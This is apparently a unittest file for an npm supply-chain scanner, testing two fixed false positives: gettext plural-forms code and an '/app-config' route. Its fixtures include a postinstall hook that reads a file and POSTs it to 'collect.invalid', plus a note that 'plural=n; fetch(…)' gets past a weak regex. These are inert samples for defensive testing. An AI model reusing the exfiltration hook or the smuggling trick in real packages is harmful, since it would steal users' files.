"""D-20 (0.1.9): two false positives the supply model's tree gave on benign bundles, files over 2,000,000 characters
that D-8 would read on the tree.

* notebook 7.6.3's `notebook_core` bundle "runs code it receives over the network": JupyterLab's gettext makes the
  plural forms of a translation its server sends a function, `Function('n', 'let plural, nplurals; ' + forms + …)`,
  after `if (!RegExp('^\\s*nplurals…plural\\s*=[\\s\\-?|&=!<>+*/%:;n0-9_()]+$').test(forms)) throw …`. What passes
  that test is arithmetic on `n`: no string, no property, no block, no name but `n`'s. A text that passed a test no
  code passes is clean for code (jsflow's `sc_checked`, `inert_pattern`); gettext.js's own test, which stops short of
  the end, is not one.
* inspect-ai 0.3.265's view bundle "reads files outside the package and sends them over the network (/app-config)":
  `/app\\b`, the container's folder, read the route `/app-config` as that folder (`\\b` holds before `-`), and every
  response the view's API helper fetched as a path under it, read by a zip reader's `readFile`. A system folder now
  ends at a separator, a quote or an interpolation (`_LD_FS_ROOT_RE`, `_LD_ABSOLUTE_IN_RE`).

Payloads are inert: nothing is installed or run; the addresses are `.invalid`."""
import unittest

from tests.registry._review_support import issues, manifest, scan_npm

RECEIVED = "runs code it receives over the network"
JUPYTER_TEST = r'RegExp("^\\s*nplurals\\s*=\\s*\\d+\\s*;\\s*plural\\s*=[\\s\\-?|&=!<>+*/%:;n0-9_()]+$")'
GETTEXT_JS_TEST = r"/^\s*nplurals\s*=\s*\d+\s*;\s*plural\s*=\s*(?:\s|[-\?\|&=!<>+*/%:;n0-9_\(\)])+/"
SEND = "fetch('https://collect.invalid/c', { method: 'POST', body: %s })"


def plural_forms(test):
    return ("function pluralFunc(forms) {\n"
            f"  if (!{test}.test(forms)) throw Error('bad plural forms: ' + forms);\n"
            "  return Function('n', 'let plural, nplurals; ' + forms + ' return plural;');\n"
            "}\n"
            "fetch('https://translations.invalid/api/translations/fr')\n"
            "  .then((r) => r.json())\n"
            "  .then((d) => pluralFunc(d[''].pluralForms));\n")


def import_risks(text):
    res = scan_npm({"package.json": manifest(main="index.js"), "index.js": text})
    return res, [i["msg"] for i in issues(res, "SC-IMPORT-RISK")]


class PluralFormsTests(unittest.TestCase):
    def test_forms_that_passed_jupyterlabs_test(self):
        res, found = import_risks(plural_forms(JUPYTER_TEST))
        self.assertFalse([m for m in found if RECEIVED in m], found)
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_forms_that_passed_a_test_short_of_the_end(self):
        # gettext.js's: `plural=n; fetch(…)` passes it
        res, found = import_risks(plural_forms(GETTEXT_JS_TEST))
        self.assertTrue([m for m in found if RECEIVED in m], found)
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_forms_that_passed_a_test_letters_pass(self):
        res, found = import_risks(plural_forms("/^[a-z()]+$/"))
        self.assertTrue([m for m in found if RECEIVED in m], found)

    def test_forms_not_tested(self):
        res, found = import_risks(plural_forms(JUPYTER_TEST).replace(
            "  if (!" + JUPYTER_TEST + ".test(forms)) throw Error('bad plural forms: ' + forms);\n", ""))
        self.assertTrue([m for m in found if RECEIVED in m], found)


class SystemFolderTests(unittest.TestCase):
    """The install-script test, whose reason inspect-ai's bundle gave."""

    def hook(self, path):
        script = ("const fs = require('fs');\n"
                  "function load(p) { return fs.readFileSync(p, 'utf8'); }\n"
                  f"const v = load('{path}');\n" + SEND % "v" + ";\n")
        res = scan_npm({"package.json": manifest(scripts={"postinstall": "node install.js"}), "install.js": script})
        return res, [(i["sev"], i["msg"]) for i in issues(res, "SC-INSTALL-HOOK")]

    def test_a_file_under_a_system_folder(self):
        res, found = self.hook("/app/config.json")
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertIn(("CRITICAL", "Install hook runs install.js, which reads files outside the package and sends "
                                   "them over the network (/app/config.json)."), found)

    def test_a_name_that_begins_with_one(self):
        for path in ("/app-config", "/data.json", "/home-page"):
            with self.subTest(path=path):
                res, found = self.hook(path)
                self.assertEqual([sev for sev, _msg in found], ["MAJOR"], found)      # the hook itself
                self.assertEqual(res["verdict"], "WARN", res["verdictReason"])


if __name__ == "__main__":
    unittest.main()
